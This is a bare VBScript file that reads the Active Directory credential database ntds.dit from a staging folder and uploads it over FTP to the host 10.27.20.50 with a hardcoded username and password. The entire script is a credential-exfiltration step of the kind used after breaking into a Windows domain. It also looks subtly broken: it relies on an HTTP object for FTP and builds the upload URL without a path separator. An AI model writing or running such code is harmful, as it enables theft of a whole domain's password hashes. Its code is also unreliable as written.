Dim objFTP
Set objFTP = CreateObject("Microsoft.XMLHTTP")

' FTP server details
Dim ftpServer, ftpUsername, ftpPassword
ftpServer = "10.27.20.50"
ftpUsername = "admin"
ftpPassword = "YellowD0ts"

' Local file details
Dim localFilePath
localFilePath = "C:\extract\ntds.dit"

' Remote file details
Dim remoteFilePath
remoteFilePath = "ntds.dit"

' Open the local file and read its contents
Dim objStream
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1 ' adTypeBinary
objStream.Open
objStream.LoadFromFile localFilePath
Dim fileContent
fileContent = objStream.Read

' Send a request to the FTP server to upload the file
objFTP.Open "PUT", "ftp://" & ftpServer & remoteFilePath, False, ftpUsername, ftpPassword
objFTP.Send fileContent

' Clean up
objStream.Close
Set objStream = Nothing
Set objFTP = Nothing

